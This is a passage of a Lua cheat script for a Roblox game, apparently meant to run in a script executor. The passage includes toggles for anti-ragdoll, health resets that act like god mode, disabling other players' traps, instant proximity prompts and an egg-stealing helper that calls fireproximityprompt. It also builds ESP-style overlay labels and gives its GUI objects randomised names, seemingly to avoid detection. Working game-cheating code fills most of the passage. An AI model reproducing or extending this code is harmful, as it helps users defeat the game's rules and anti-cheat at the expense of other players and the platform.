	local v24, humanoid, fn32, fn33

	do
		local n19 = 5
		local n20 = 0

		v22 = fn2(function()
			return ReplicatedStorage.Shared.Modules.Ragdoll
		end)

		local v25 = nil

		fn30 = function()
			if v25 then
				return v25
			end

			local ok, result = pcall(function()
				return require(localPlayer:WaitForChild("PlayerScripts", 5):WaitForChild("PlayerModule", 5)):GetControls()
			end)

			if ok then
				v25 = result
			end

			return v25
		end

		v23 = nil
		flag7 = false
		connection = nil
		n17 = 0
		fn31 = nil
		tbl32 = {}
		tbl33 = {}
		n18 = 0
		v24 = nil
		humanoid = nil

		fn32 = function(arg)
			for _, v26 in ipairs(arg) do
				if v26.Connected then
					v26:Disconnect()
				end
			end

			table.clear(arg)
		end

		fn33 = function(arg)
			tbl32[#tbl32 + 1] = arg
		end

		local function fn34(arg)
			tbl33[#tbl33 + 1] = arg
		end

		local function fn35()
			if not v24 or not humanoid then
				return
			end
			local humanoidRootPart = v24:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart then
				return
			end
			local assemblyLinearVelocity = humanoidRootPart.AssemblyLinearVelocity
			local vector = Vector3.new(assemblyLinearVelocity.X, 0, assemblyLinearVelocity.Z)
			local n21 = humanoid.WalkSpeed + n19
			local y = assemblyLinearVelocity.Y
			local flag8 = false

			if vector.Magnitude > n21 then
				vector = vector.Unit * n21
				flag8 = true
			end

			if n20 < y then
				y = n20
				flag8 = true
			end

			if flag8 then
				pcall(function()
					humanoidRootPart.AssemblyLinearVelocity = Vector3.new(vector.X, y, vector.Z)
				end)
			end
		end

		local function fn36()
			if type(v22) ~= "table" then
				return
			end

			if type(v22.ClearClientRagdoll) == "function" then
				pcall(v22.ClearClientRagdoll)
			end

			if type(v22.Unragdoll) == "function" then
				pcall(v22.Unragdoll, v24)
			end
		end

		local function fn37()
			if not v24 or not v24.Parent then
				return
			end

			for _, descendant in ipairs(v24:GetDescendants()) do
				if tbl30[descendant.ClassName] then
					pcall(function()
						descendant:Destroy()
					end)
				end
			end
		end

		local function fn38()
			if not v24 or not v24.Parent then
				return
			end

			for _, descendant in ipairs(v24:GetDescendants()) do
				if descendant:IsA("Motor6D") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				elseif descendant:IsA("AnimationConstraint") and not descendant.Enabled then
					pcall(function()
						descendant.Enabled = true
					end)
				end
			end
		end

		local function fn39()
			local v26 = fn30()

			if v26 and v26.controlsEnabled == false then
				pcall(function()
					v26:Enable()
				end)
			end
		end

		local function fn40()
			local currentCamera = workspace.CurrentCamera

			if currentCamera and humanoid and currentCamera.CameraSubject ~= humanoid then
				pcall(function()
					currentCamera.CameraSubject = humanoid
				end)
			end
		end

		local function fn41()
			if not humanoid or not humanoid.Parent or humanoid.Health <= 0 then
				return
			end

			if tbl31[humanoid:GetState()] then
				pcall(function()
					humanoid:ChangeState(Enum.HumanoidStateType.Running)
				end)
			end

			if humanoid.PlatformStand then
				humanoid.PlatformStand = false
			end
		end

		local function fn42()
			if type(v22) == "table" and type(v22.IsRagdolled) == "function" then
				local ok, result = pcall(v22.IsRagdolled, v24)
				if ok and result == true then
					return true
				end
			end

			local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
			return num ~= nil and num > workspace:GetServerTimeNow()
		end

		local n21 = 21

		local function fn43()
			if tbl3.AntiGuard.Busy == true then
				return true
			end

			if (tonumber(tbl3.AntiGuard.HitArms) or 0) <= 0 then
				return false
			end
			return os.clock() - (tonumber(tbl3.AntiGuard.HitArmedAt) or 0) <= n21
		end

		local function fn44()
			if not humanoid or not humanoid.Parent then
				return false
			end

			if humanoid.PlatformStand then
				return true
			end
			return tbl31[humanoid:GetState()] == true
		end

		local function fn45()
			if not v24 or not v24.Parent then
				return false
			end

			for _, child in ipairs(v24:GetChildren()) do
				if tbl30[child.ClassName] then
					return true
				end

				if child:IsA("BasePart") then
					for _, child2 in ipairs(child:GetChildren()) do
						if tbl30[child2.ClassName] then
							return true
						end
					end
				end
			end

			return false
		end

		local function fn46()
			fn35()
			fn36()
			fn37()
			fn38()
			fn41()
			fn39()
			fn40()
		end

		local function fn47()
			if not flag7 or fn43() then
				return
			end
			n17 = os.clock() + n16
		end

		local function fn48()
			local character = localPlayer.Character

			if character ~= v24 then
				if character then
					fn31(character)
				else
					n18 += 1
					fn32(tbl33)
					v24 = nil
					humanoid = nil
				end

				return
			end

			if not v24 then
				return
			end

			if v24:FindFirstChildOfClass("Humanoid") ~= humanoid then
				fn31(v24)
			end
		end

		local function fn49()
			if not flag7 then
				return
			end
			fn48()
			if not v24 or not humanoid or humanoid.Health <= 0 then
				return
			end

			if fn43() then
				n17 = 0
				return
			end
			local now = os.clock()

			if fn44() or fn42() or fn45() then
				n17 = now + n16
			end

			if now <= n17 then
				fn46()
			end
		end

		fn31 = function(arg)
			n18 += 1
			local v26 = n18
			fn32(tbl33)
			v24 = arg
			humanoid = nil
			if not flag7 or not arg then
				return
			end
			humanoid = arg:FindFirstChildOfClass("Humanoid")
			if not flag7 or n18 ~= v26 or arg ~= localPlayer.Character or not humanoid or not humanoid:IsA("Humanoid") then
				return
			end

			fn34(humanoid.StateChanged:Connect(function(old, new)
				if flag7 and tbl31[new] then
					fn47()
				end
			end))

			fn34(humanoid:GetPropertyChangedSignal("PlatformStand"):Connect(function()
				if flag7 and humanoid and humanoid.PlatformStand then
					fn47()
				end
			end))

			fn34(arg.DescendantAdded:Connect(function(descendant)
				if flag7 and tbl30[descendant.ClassName] then
					fn47()
				end
			end))

			fn34(arg.ChildAdded:Connect(function(child)
				if flag7 and child:IsA("Humanoid") and child ~= humanoid then
					task.defer(fn48)
				end
			end))

			fn40()

			if fn42() then
				fn47()
			end
		end

		local function fn50()
			flag7 = false
			n18 += 1
			n17 = 0

			if connection then
				pcall(function()
					connection:Disconnect()
				end)

				connection = nil
			end

			fn32(tbl33)
			fn32(tbl32)
			v24 = nil
			humanoid = nil
		end

		local function fn51()
			fn50()
			flag7 = true
			fn30()
			connection = RunService.Heartbeat:Connect(fn49)

			fn33(localPlayer.CharacterAdded:Connect(function(character)
				if flag7 then
					task.defer(function()
						if flag7 and character == localPlayer.Character then
							fn31(character)
						end
					end)
				end
			end))

			fn33(localPlayer.CharacterRemoving:Connect(function(character)
				if flag7 and character == v24 then
					n18 += 1
					n17 = 0
					fn32(tbl33)
					v24 = nil
					humanoid = nil
				end
			end))

			fn33(localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
				if flag7 then
					fn47()
				end
			end))

			local clientRagdollRemote = type(v22) == "table" and v22.ClientRagdollRemote or nil

			if typeof(clientRagdollRemote) == "Instance" and clientRagdollRemote:IsA("RemoteEvent") then
				fn33(clientRagdollRemote.OnClientEvent:Connect(function()
					if flag7 and not fn43() then
						fn35()
						fn47()
					end
				end))
			end

			fn33(tbl3.OnHumanoidChanged(function()
				if flag7 and localPlayer.Character then
					fn31(localPlayer.Character)
				end
			end))

			if localPlayer.Character then
				fn31(localPlayer.Character)
			end
		end

		fn4(fn50)

		v23 = v21:CreateToggle({
			Name = "Anti Ragdoll",
			Default = true,
			Callback = function()
				if tbl3.Toggle(v23, false) then
					fn51()
				else
					fn50()
				end
			end,
		})
	end

	do
		local flag8 = false
		local tbl34 = {}

		local function fn34()
			for _, v25 in ipairs(tbl34) do
				pcall(function()
					v25:Disconnect()
				end)
			end

			table.clear(tbl34)
		end

		local function fn35(arg)
			if flag8 and arg.Parent and arg.Health > 0 and arg.Health < arg.MaxHealth then
				pcall(function()
					arg.Health = arg.MaxHealth
				end)
			end
		end

		local function fn36(arg)
			fn34()
			if not flag8 or not arg then
				return
			end
			local humanoid2 = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
			if not flag8 or not humanoid2 or not humanoid2:IsA("Humanoid") or arg ~= localPlayer.Character then
				return
			end

			table.insert(tbl34, humanoid2.HealthChanged:Connect(function()
				fn35(humanoid2)
			end))

			table.insert(tbl34, RunService.Heartbeat:Connect(function()
				fn35(humanoid2)
			end))

			fn35(humanoid2)
		end

		local connection2 = localPlayer.CharacterAdded:Connect(function(character)
			if flag8 then
				task.defer(fn36, character)
			end
		end)

		local v25 = tbl3.OnHumanoidChanged(function()
			if flag8 and localPlayer.Character then
				fn36(localPlayer.Character)
			end
		end)

		fn4(function()
			flag8 = false
			connection2:Disconnect()
			v25:Disconnect()
			fn34()
		end)

		flag8 = true

		if localPlayer.Character then
			task.spawn(fn36, localPlayer.Character)
		end
	end

	do
		local v25 = nil
		local flag8 = true
		local tbl34 = {}
		local tbl35 = {}

		local function fn34(arg)
			if arg:IsA("BasePart") and tbl34[arg] == nil then
				tbl34[arg] = arg.CanTouch

				pcall(function()
					arg.CanTouch = false
				end)
			end
		end

		local function fn35(arg)
			if not flag8 or not arg.Parent then
				return
			end
			local name = localPlayer.Name
			if arg:GetAttribute("Owner") == name then
				return
			end
			fn34(arg)

			for _, descendant in ipairs(arg:GetDescendants()) do
				fn34(descendant)
			end

			table.insert(tbl35, arg.DescendantAdded:Connect(function(descendant)
				if flag8 then
					fn34(descendant)
				end
			end))
		end

		local function fn36()
			for _, v26 in ipairs(CollectionService:GetTagged("PlacedTrap")) do
				fn35(v26)
			end
		end

		local function fn37()
			for k, v26 in pairs(tbl34) do
				if k.Parent then
					pcall(function()
						k.CanTouch = v26
					end)
				end
			end

			table.clear(tbl34)
		end

		table.insert(tbl35, CollectionService:GetInstanceAddedSignal("PlacedTrap"):Connect(function(arg)
			task.defer(fn35, arg)
		end))

		v25 = v21:CreateToggle({
			Name = "Anti Trap",
			Note = "Traps from other players cannot catch you",
			Default = true,
			Callback = function()
				flag8 = tbl3.Toggle(v25, true) == true

				if flag8 then
					fn36()
				else
					fn37()
				end
			end,
		})

		fn36()

		fn4(function()
			flag8 = false

			for _, v26 in ipairs(tbl35) do
				pcall(function()
					v26:Disconnect()
				end)
			end

			table.clear(tbl35)
			fn37()
		end)
	end

	do
		local v25 = nil
		local str3 = "CarryAreaEgg"
		local tbl34 = { ClaimLostPart = true }
		local tbl35 = {}
		local connection2 = nil
		local connection3 = nil

		local function fn34(arg)
			if not arg:IsA("ProximityPrompt") or tbl34[arg.Name] then
				return
			end

			if tbl35[arg] == nil then
				if arg.HoldDuration <= 0 and arg.Name ~= str3 then
					return
				end
				tbl35[arg] = arg.HoldDuration
			end

			if arg.HoldDuration ~= 0 then
				pcall(function()
					arg.HoldDuration = 0
				end)
			end
		end

		local function fn35(arg)
			if arg.Name ~= "SmartPromptPart" then
				return nil
			end
			local carryAreaEgg = arg:FindFirstChild("CarryAreaEgg")
			return carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and carryAreaEgg or nil
		end

		tbl3.PromptHold = function(arg)
			local v26 = tbl35[arg]
			if type(v26) == "number" then
				return v26
			end
			return arg.HoldDuration
		end

		local function fn36()
			if connection2 then
				return
			end

			connection3 = ProximityPromptService.PromptShown:Connect(function(arg)
				if tbl3.Toggle(v25, true) then
					fn34(arg)
				end
			end)

			for _, child in ipairs(workspace:GetChildren()) do
				local v26 = fn35(child)

				if v26 then
					fn34(v26)
				end
			end

			connection2 = workspace.ChildAdded:Connect(function(child)
				if child.Name ~= "SmartPromptPart" then
					return
				end

				task.defer(function()
					local carryAreaEgg = child:FindFirstChild("CarryAreaEgg") or child:WaitForChild("CarryAreaEgg", 2)

					if carryAreaEgg and carryAreaEgg:IsA("ProximityPrompt") and tbl3.Toggle(v25, true) then
						fn34(carryAreaEgg)
					end
				end)
			end)
		end

		local function fn37()
			for k, v26 in pairs(tbl35) do
				if k and k.Parent then
					pcall(function()
						k.HoldDuration = v26
					end)
				end
			end

			table.clear(tbl35)

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end
		end

		tbl3.PressStealPrompt = function(arg)
			if typeof(fireproximityprompt) ~= "function" or not arg then
				return false
			end
			local v26 = nil
			local huge = math.huge

			for _, child in ipairs(workspace:GetChildren()) do
				local v27 = fn35(child)

				if v27 and child:IsA("BasePart") then
					local magnitude = (child.Position - arg).Magnitude

					if magnitude < huge then
						v26 = v27
						huge = magnitude
					end
				end
			end

			if not v26 or huge > 14 then
				return false
			end

			if tbl3.Toggle(v25, true) then
				pcall(function()
					v26.HoldDuration = 0
				end)
			end

			local ok = pcall(fireproximityprompt, v26)

			if ok and v26.HoldDuration > 0 then
				task.wait(v26.HoldDuration + 0.1)
			end

			return ok
		end

		tbl2.Add(function()
			if tbl3.Toggle(v25, true) then
				fn36()

				for k in pairs(tbl35) do
					if not k.Parent then
						tbl35[k] = nil
					elseif k.HoldDuration ~= 0 then
						pcall(function()
							k.HoldDuration = 0
						end)
					end
				end
			elseif next(tbl35) ~= nil or connection2 then
				fn37()
			end

			return false
		end)

		v25 = v21:CreateToggle({
			Name = "Instant Prompts",
			Default = true,
			Callback = function()
				tbl2.Wake()
			end,
		})

		fn4(fn37)
	end

	espSection = tbl3.EspSection

	local function fn34(arg, arg2)
		local ok, result = pcall(Font.new, arg, arg2, Enum.FontStyle.Normal)
		return ok and result or nil
	end

	tbl4 = {
		MainFont = fn34("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold),
		StatusFont = fn34("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular),
		Sequence = function(arg)
			local v25 = table.create(#arg)

			for i, v26 in ipairs(arg) do
				v25[i] = ColorSequenceKeypoint.new(v26[1], v26[2])
			end

			return ColorSequence.new(v25)
		end,
	}

	local color
	color = Color3.fromRGB
	local sequence
	sequence = tbl4.Sequence
	local palettes
	palettes = {}

	do
		local gold = {}
		local tbl34 = {}
		local tbl35 = { 0, color(255, 231, 158) }
		local tbl36 = { 0.4, color(255, 196, 66) }
		local tbl37 = { 1, color(214, 142, 12) }
		tbl34[1] = tbl35
		tbl34[2] = tbl36
		tbl34[3] = tbl37
		gold.Text = sequence(tbl34)
		local tbl38 = {}
		local tbl39 = { 0, color(122, 76, 0) }
		local tbl40 = { 0.55, color(62, 38, 0) }
		local tbl41 = { 1, color(20, 12, 0) }
		tbl38[1] = tbl39
		tbl38[2] = tbl40
		tbl38[3] = tbl41
		gold.Stroke = sequence(tbl38)
		gold.Outline = color(255, 232, 152)
		palettes.Gold = gold
	end

	do
		local orange = {}
		local tbl34 = {}
		local tbl35 = { 0, color(255, 198, 132) }
		local tbl36 = { 0.4, color(255, 146, 40) }
		local tbl37 = { 1, color(206, 92, 0) }
		tbl34[1] = tbl35
		tbl34[2] = tbl36
		tbl34[3] = tbl37
		orange.Text = sequence(tbl34)
		local tbl38 = {}
		local tbl39 = { 0, color(112, 54, 0) }
		local tbl40 = { 0.55, color(56, 27, 0) }
		local tbl41 = { 1, color(18, 8, 0) }
		tbl38[1] = tbl39
		tbl38[2] = tbl40
		tbl38[3] = tbl41
		orange.Stroke = sequence(tbl38)
		orange.Outline = color(255, 194, 112)
		palettes.Orange = orange
	end

	do
		local red = {}
		local tbl34 = {}
		local tbl35 = { 0, color(255, 105, 105) }
		local tbl36 = { 0.4, color(255, 28, 40) }
		local tbl37 = { 1, color(184, 0, 18) }
		tbl34[1] = tbl35
		tbl34[2] = tbl36
		tbl34[3] = tbl37
		red.Text = sequence(tbl34)
		local tbl38 = {}
		local tbl39 = { 0, color(124, 0, 15) }
		local tbl40 = { 0.55, color(61, 0, 9) }
		local tbl41 = { 1, color(18, 0, 3) }
		tbl38[1] = tbl39
		tbl38[2] = tbl40
		tbl38[3] = tbl41
		red.Stroke = sequence(tbl38)
		red.Outline = color(255, 128, 138)
		palettes.Red = red
	end

	do
		local accent = {}
		local tbl34 = {}
		local tbl35 = { 0, color(170, 255, 160) }
		local tbl36 = { 0.45, color(58, 255, 55) }
		local tbl37 = { 1, color(20, 109, 0) }
		tbl34[1] = tbl35
		tbl34[2] = tbl36
		tbl34[3] = tbl37
		accent.Text = sequence(tbl34)
		local tbl38 = {}
		local tbl39 = { 0, color(10, 52, 6) }
		local tbl40 = { 1, color(3, 16, 0) }
		tbl38[1] = tbl39
		tbl38[2] = tbl40
		accent.Stroke = sequence(tbl38)
		accent.Outline = color(58, 255, 55)
		palettes.Accent = accent
	end

	do
		local sheen = {}
		local tbl34 = {}
		local tbl35 = { 0, color(255, 255, 255) }
		local tbl36 = { 0.5, color(222, 222, 222) }
		local tbl37 = { 1, color(255, 255, 255) }
		tbl34[1] = tbl35
		tbl34[2] = tbl36
		tbl34[3] = tbl37
		sheen.Text = sequence(tbl34)
		local tbl38 = {}
		local tbl39 = { 0, color(8, 8, 8) }
		local tbl40 = { 1, color(8, 8, 8) }
		tbl38[1] = tbl39
		tbl38[2] = tbl40
		sheen.Stroke = sequence(tbl38)
		sheen.Outline = color(255, 255, 255)
		palettes.Sheen = sheen
	end

	tbl4.Palettes = palettes

	tbl4.PaletteFromColor = function(arg)
		local color2 = Color3.new(1, 1, 1)
		local color3 = Color3.new(0, 0, 0)
		local tbl34 = {}
		local sequence2 = tbl4.Sequence
		local tbl35 = {}
		local tbl36 = { 0, arg:Lerp(color2, 0.5) }
		local tbl37 = { 0.4, arg:Lerp(color2, 0.1) }
		local tbl38 = { 1, arg:Lerp(color3, 0.25) }
		tbl35[1] = tbl36
		tbl35[2] = tbl37
		tbl35[3] = tbl38
		tbl34.Text = sequence2(tbl35)
		local sequence3 = tbl4.Sequence
		local tbl39 = {}
		local tbl40 = { 0, arg:Lerp(color3, 0.55) }
		local tbl41 = { 0.55, arg:Lerp(color3, 0.75) }
		local tbl42 = { 1, arg:Lerp(color3, 0.92) }
		tbl39[1] = tbl40
		tbl39[2] = tbl41
		tbl39[3] = tbl42
		tbl34.Stroke = sequence3(tbl39)
		tbl34.Outline = arg:Lerp(color2, 0.25)
		return tbl34
	end

	tbl4.SizeScale = 1
	local tbl34 = {}

	tbl4.OnSizeChanged = function(arg)
		table.insert(tbl34, arg)
	end

	tbl4.SetSizeScale = function(sizeScale)
		if tbl4.SizeScale == sizeScale then
			return
		end
		tbl4.SizeScale = sizeScale

		for _, v25 in ipairs(tbl34) do
			pcall(v25)
		end
	end

	tbl4.RowHeight = function(arg)
		local currentCamera = workspace.CurrentCamera
		return math.max(6, math.floor(math.clamp((currentCamera and currentCamera.ViewportSize.Y or 1080) * 0.014, 13, 19) * (arg or tbl4.SizeScale)))
	end

	tbl4.ScaledWidth = function(arg, arg2)
		return math.max(30, math.floor(arg * (arg2 or tbl4.SizeScale)))
	end

	tbl4.CreateRuntime = function()
		local screenGui = Instance.new("ScreenGui")
		screenGui.Name = fn3()
		screenGui.Archivable = false
		screenGui.ResetOnSpawn = false
		screenGui.IgnoreGuiInset = true
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.DisplayOrder = 48
		screenGui.Parent = v3
		return screenGui
	end

	tbl4.CreateTag = function(parent, maxDistance)
		local billboardGui = Instance.new("BillboardGui")
		billboardGui.Name = fn3()
		billboardGui.AlwaysOnTop = true
		billboardGui.LightInfluence = 0
		billboardGui.MaxDistance = maxDistance
		local frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Size = UDim2.fromScale(1, 1)
		frame.Parent = billboardGui
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.Name = fn3()
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Parent = frame
		billboardGui.Parent = parent
		return billboardGui, frame
	end

	tbl4.CreateTextRow = function(parent, fontFace, layoutOrder, arg)
		local frame = Instance.new("Frame")
		frame.Name = fn3()
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Size = UDim2.fromScale(1, arg)
		frame.LayoutOrder = layoutOrder
		frame.Parent = parent

		local function createTextLabel(zIndex)
			local textLabel = Instance.new("TextLabel")
			textLabel.Name = fn3()
			textLabel.BackgroundTransparency = 1
			textLabel.Size = UDim2.fromScale(1, 1)
			textLabel.Text = ""
			textLabel.TextScaled = true
			textLabel.TextStrokeTransparency = 1
			textLabel.TextXAlignment = Enum.TextXAlignment.Center
			textLabel.TextYAlignment = Enum.TextYAlignment.Center
			textLabel.ZIndex = zIndex

			if fontFace then
				textLabel.FontFace = fontFace
			else
				textLabel.Font = Enum.Font.GothamBold
			end

			textLabel.Parent = frame
			return textLabel
		end

		local v25 = createTextLabel(2)
		v25.Position = UDim2.fromOffset(1, 1)
		v25.TextColor3 = Color3.new(0, 0, 0)
		v25.TextTransparency = 0.1
		local v26 = createTextLabel(3)
		v26.TextColor3 = Color3.new(1, 1, 1)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Name = fn3()
		uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
		uiStroke.LineJoinMode = Enum.LineJoinMode.Round
		uiStroke.Color = Color3.new(1, 1, 1)
		uiStroke.Transparency = 0.05

		uiStroke.Thickness = pcall(function()
			uiStroke.StrokeSizingMode = Enum.StrokeSizingMode.ScaledSize
		end) and 0.05 or 1.2

		uiStroke.Parent = v26
		local uiGradient = Instance.new("UIGradient")
		uiGradient.Name = fn3()
		uiGradient.Rotation = 90
		uiGradient.Parent = uiStroke
		local uiGradient2 = Instance.new("UIGradient")
		uiGradient2.Name = fn3()
		uiGradient2.Rotation = 90
		uiGradient2.Parent = v26
		return { Holder = frame, Shadow = v25, Label = v26, StrokeGradient = uiGradient, TextGradient = uiGradient2, Palette = nil }
	end

	tbl4.SetRow = function(arg, text, palette)
		if arg.Label.Text ~= text then
			arg.Label.Text = text
			arg.Shadow.Text = text
		end

		if arg.Palette ~= palette then
			arg.Palette = palette
			arg.TextGradient.Color = palette.Text
			arg.TextGradient.Rotation = palette.Rotation or 90
			arg.StrokeGradient.Color = palette.Stroke
		end
	end

	tbl4.ReadToggle = function(arg, arg2)
		if type(arg) ~= "table" then
			return arg2 == true
		end

		local ok, result = pcall(function()
			local controller = arg._controller
			return type(controller) == "table" and type(controller.GetValue) == "function" and controller.GetValue()
		end)

		if ok and type(result) == "boolean" then
			return result
		end

		for _, v25 in ipairs({ "Get", "GetValue" }) do
			local ok2, result2 = pcall(function()
				return arg[v25]
			end)

			if ok2 and type(result2) == "function" then
				local ok3, result3 = pcall(result2, arg)
				if ok3 and type(result3) == "boolean" then
					return result3
				end
			end
		end

		return arg2 == true
	end

	tbl4.SyncSoon = function(arg)
		arg()
		task.delay(0.35, arg)
	end

	tbl4.GetGuardAreas = function()
		local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
		world = world and world:FindFirstChild("Areas")
		return world and world:FindFirstChild("GuardAreas")
	end

	tbl4.FindGuardRoot = function(arg)
		local humanoidRootPart = arg:FindFirstChild("HumanoidRootPart")
		if humanoidRootPart and humanoidRootPart:IsA("BasePart") then
			return humanoidRootPart
		end

		if arg.PrimaryPart then
			return arg.PrimaryPart
		end
		return arg:FindFirstChildWhichIsA("BasePart", true)
	end

	tbl4.WatchGuards = function(arg)
		local tbl35 = {}
		local v25 = tbl4.GetGuardAreas()
		if not v25 then
			return tbl35
		end

		local function fn35(child)
			local guard = child:FindFirstChild("Guard")

			if guard and guard:IsA("Model") then
				arg(child.Name, guard)
			end

			table.insert(tbl35, child.ChildAdded:Connect(function(child2)
				if child2.Name == "Guard" and child2:IsA("Model") then
					arg(child.Name, child2)
				end
			end))
		end

		for _, child in ipairs(v25:GetChildren()) do
			fn35(child)
		end

		table.insert(tbl35, v25.ChildAdded:Connect(fn35))
		return tbl35
	end

	tbl4.DisconnectAll = function(arg)
		for _, v25 in ipairs(arg) do
			pcall(function()
				v25:Disconnect()
			end)
		end

		table.clear(arg)
	end

	n3 = 18

	tbl5 = {
		"Icon",
		"Name",
		"Rarity",
		"Mutation",
		"Value",
		"Weight",
		"Size",
		"Sell Price",
		"Distance",
		"Area",
		"State",
	}

	tbl6 = { "Icon", "Name", "Value" }
	tbl7 = { "Off", "Rare Only", "All Shown" }
	tbl8 = { Icon = 3.2, Name = 1.35, Rarity = 1.2, Mutation = 1, Value = 1.1, Info = 1 }

	local function fn35()
		local ok, result = pcall(Font.new, "rbxassetid://12187365977", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
		return ok and result or tbl4.StatusFont
	end

	v6 = fn35()

	do
		local sequence2 = tbl4.Sequence
		local tbl35 = {}
		local tbl36 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl37 = { 0.2, Color3.fromRGB(206, 212, 224) }
		local tbl38 = { 0.42, Color3.fromRGB(74, 80, 94) }
		local tbl39 = { 0.58, Color3.fromRGB(42, 46, 56) }
		local tbl40 = { 0.78, Color3.fromRGB(158, 166, 182) }
		local tbl41 = { 1, Color3.fromRGB(250, 252, 255) }
		tbl35[1] = tbl36
		tbl35[2] = tbl37
		tbl35[3] = tbl38
		tbl35[4] = tbl39
		tbl35[5] = tbl40
		tbl35[6] = tbl41
		v7 = sequence2(tbl35)
	end

	v8 = tbl4.PaletteFromColor(Color3.fromRGB(77, 255, 122))
	tbl9 = {}

	do
		local sequence2 = tbl4.Sequence
		local tbl35 = {}
		local tbl36 = { 0, Color3.fromRGB(255, 255, 255) }
		local tbl37 = { 0.5, Color3.fromRGB(222, 238, 255) }
		local tbl38 = { 1, Color3.fromRGB(255, 255, 255) }
		tbl35[1] = tbl36
		tbl35[2] = tbl37
		tbl35[3] = tbl38
		tbl9.Text = sequence2(tbl35)
	end
end

local v9, v10, v11, tbl10, paint, bold, color, n4, v12, tbl11
local tbl12, tbl13, tbl14, flag, n5, fn7, fn8, fn9, fn10, fn11
local fn12, fn13

do
	local n6, n7, n8, tbl15, n9, n10, n11, n12, n13, n14
	local tweenInfo, tweenInfo2, tweenInfo3, tweenInfo4, tweenInfo5, TweenService, color2, fn14, tbl16, tbl17

	do
		do
			local sequence = tbl4.Sequence
			local tbl18 = {}
			local tbl19 = { 0, Color3.fromRGB(8, 8, 8) }
			local tbl20 = { 1, Color3.fromRGB(8, 8, 8) }
			tbl18[1] = tbl19
			tbl18[2] = tbl20
			tbl9.Stroke = sequence(tbl18)
		end

		tbl9.Outline = Color3.fromRGB(255, 255, 255)
		local n15
		n15 = 0.8
		local n16
		n16 = 4.5
		local n17
		n17 = 20
		local n18
		n18 = 0.002
		local tbl18
		tbl18 = { Golden = tbl4.Palettes.Gold }

		do
			local silver = {}
			local sequence = tbl4.Sequence
			local tbl19 = {}
			local tbl20 = { 0, Color3.fromRGB(255, 255, 255) }
			local tbl21 = { 0.45, Color3.fromRGB(214, 222, 232) }
			local tbl22 = { 1, Color3.fromRGB(150, 160, 175) }
			tbl19[1] = tbl20
			tbl19[2] = tbl21
			tbl19[3] = tbl22
			silver.Text = sequence(tbl19)
			local sequence2 = tbl4.Sequence
			local tbl23 = {}
			local tbl24 = { 0, Color3.fromRGB(60, 66, 78) }
			local tbl25 = { 0.55, Color3.fromRGB(30, 33, 40) }
			local tbl26 = { 1, Color3.fromRGB(10, 11, 14) }
			tbl23[1] = tbl24
			tbl23[2] = tbl25
			tbl23[3] = tbl26
			silver.Stroke = sequence2(tbl23)
			silver.Outline = Color3.fromRGB(214, 222, 232)
			tbl18.Silver = silver
		end

		tbl18.Sakura = tbl4.PaletteFromColor(Color3.fromRGB(255, 158, 216))
		tbl18.GreatBloom = tbl4.PaletteFromColor(Color3.fromRGB(124, 255, 196))
		tbl18.Boss = tbl4.PaletteFromColor(Color3.fromRGB(255, 122, 122))
		tbl18.Monstrous = tbl4.PaletteFromColor(Color3.fromRGB(192, 139, 255))

		do
			local rainbow = {}
			local sequence = tbl4.Sequence
			local tbl19 = {}
			local tbl20 = { 0, Color3.fromRGB(255, 107, 107) }
			local tbl21 = { 0.2, Color3.fromRGB(255, 179, 107) }
			local tbl22 = { 0.4, Color3.fromRGB(255, 240, 107) }
			local tbl23 = { 0.6, Color3.fromRGB(107, 255, 138) }
			local tbl24 = { 0.8, Color3.fromRGB(107, 200, 255) }
			local tbl25 = { 1, Color3.fromRGB(185, 107, 255) }
			tbl19[1] = tbl20
			tbl19[2] = tbl21
			tbl19[3] = tbl22
			tbl19[4] = tbl23
			tbl19[5] = tbl24
			tbl19[6] = tbl25
			rainbow.Text = sequence(tbl19)
			local sequence2 = tbl4.Sequence
			local tbl26 = {}
			local tbl27 = { 0, Color3.fromRGB(20, 20, 30) }
			local tbl28 = { 1, Color3.fromRGB(8, 8, 12) }
			tbl26[1] = tbl27
			tbl26[2] = tbl28
			rainbow.Stroke = sequence2(tbl26)
			rainbow.Outline = Color3.fromRGB(255, 255, 255)
			rainbow.Rotation = 0
			tbl18.Rainbow = rainbow
		end

		local v13
		v13 = tbl4.PaletteFromColor(Color3.fromRGB(143, 227, 255))
		local rfEggWorldAskFieldEggSnapshot
		rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
		local n19
		n19 = 0
		local tbl19

		tbl19 = {
			Eggs = false,
			MinRarity = 5,
			Specific = {},
			MutationSet = {},
			AnyMutation = false,
			NoMutation = false,
			Info = {},
			Highlight = tbl7[1],
			MinValue = 0,
			HighlightMin = 6,
			MaxDistance = math.huge,
			SizeScale = 0.75,
			FixedSize = false,
			OwnBase = true,
		}

		for _, v14 in ipairs(tbl6) do
			tbl19.Info[v14] = true
		end

		local tbl20
		tbl20 = {}
		local tbl21, v14, flag2, n20, n21, flag3, v15, fn15, fn16, tbl22
		local fn17

		do
			local tbl23 = {}
			tbl21 = {}
			v14 = nil
			flag2 = false
			n20 = 0
			n21 = 0
			flag3 = false
			v15 = nil
			local n22 = 0

			local function fn18(arg)
